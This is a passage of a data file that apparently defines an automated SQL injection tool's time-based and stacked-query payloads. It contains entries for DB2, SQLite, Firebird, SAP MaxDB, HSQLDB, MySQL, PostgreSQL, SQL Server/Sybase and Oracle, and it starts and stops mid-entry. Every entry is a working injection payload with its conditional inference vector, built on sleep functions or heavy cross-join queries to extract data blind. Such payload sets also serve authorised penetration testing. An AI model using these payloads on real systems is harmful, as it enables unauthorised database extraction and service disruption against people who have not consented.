{'payload': ';SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3'}, 'vector': ';SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SQLite > 2.0 stacked queries (heavy query - comment)', 'clause': [0], 'level': 3, 'request': {'comment': '--', 'payload': ";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': ";SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'SQLite > 2.0 stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': ";SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'Firebird stacked queries (heavy query - comment)', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ';SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4'}, 'vector': ';SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'Firebird stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ';SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4'}, 'vector': ';SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 4}, {'risk': 2, 'title': 'SAP MaxDB stacked queries (heavy query - comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '--', 'payload': ';SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3'}, 'vector': ';SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SAP MaxDB stacked queries (heavy query)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': ';SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3'}, 'vector': ';SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ';CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)'}, 'vector': ';CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END', 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ';CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)'}, 'vector': ';CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END', 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'HSQLDB >= 2.0 stacked queries (heavy query - comment)', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': ";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 2, 'title': 'HSQLDB >= 2.0 stacked queries (heavy query)', 'clause': [0], 'level': 5, 'request': {'payload': ";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 4}, {'risk': 1, 'title': 'MySQL >= 5.0.12 AND time-based blind (SELECT)', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': 'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL >= 5.0.12 OR time-based blind (SELECT)', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': 'OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)', 'clause': [1, 2, 3], 'level': 3, 'request': {'comment': '#', 'payload': 'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL >= 5.0.12 OR time-based blind (SELECT - comment)', 'clause': [1, 2, 3], 'level': 3, 'request': {'comment': '#', 'payload': 'OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 AND time-based blind', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'AND SLEEP([SLEEPTIME])'}, 'vector': 'AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL >= 5.0.12 OR time-based blind', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'OR SLEEP([SLEEPTIME])'}, 'vector': 'OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 AND time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '#', 'payload': 'AND SLEEP([SLEEPTIME])'}, 'vector': 'AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL >= 5.0.12 OR time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '#', 'payload': 'OR SLEEP([SLEEPTIME])'}, 'vector': 'OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL <= 5.0.11 AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL <= 5.0.11 OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': "OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '#', 'payload': "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '#', 'payload': "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, 'vector': "OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 RLIKE time-based blind (SELECT)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 RLIKE time-based blind (SELECT - comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '#', 'payload': 'RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': 'RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 RLIKE time-based blind', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'RLIKE SLEEP([SLEEPTIME])'}, 'vector': 'RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 RLIKE time-based blind (comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '#', 'payload': 'RLIKE SLEEP([SLEEPTIME])'}, 'vector': 'RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL AND time-based blind (ELT)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'AND ELT([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL OR time-based blind (ELT)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'OR ELT([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL AND time-based blind (ELT - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '#', 'payload': 'AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'AND ELT([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'MySQL OR time-based blind (ELT - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '#', 'payload': 'OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'OR ELT([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'PostgreSQL > 8.1 AND time-based blind', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': 'AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'PostgreSQL > 8.1 OR time-based blind', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': 'OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'PostgreSQL > 8.1 AND time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'PostgreSQL > 8.1 OR time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'PostgreSQL AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'PostgreSQL OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'PostgreSQL AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'PostgreSQL OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase time-based blind', 'clause': [0], 'level': 1, 'request': {'payload': "WAITFOR DELAY '0:0:[SLEEPTIME]'"}, 'vector': "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase time-based blind (comment)', 'clause': [0], 'level': 4, 'request': {'comment': '--', 'payload': "WAITFOR DELAY '0:0:[SLEEPTIME]'"}, 'vector': "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle AND time-based blind', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, 'vector': "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'Oracle OR time-based blind', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, 'vector': "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle AND time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '--', 'payload': "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, 'vector': "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'Oracle OR time-based blind (comment)', 'clause': [1, 2, 3], 'level': 4, 'request': {'comment': '--', 'payload': "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, 'vector': "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Oracle AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Oracle OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'Oracle AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)'}, 'vector': 'AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Oracle OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)'}, 'vector': 'OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'IBM DB2 AND time-based blind (heavy 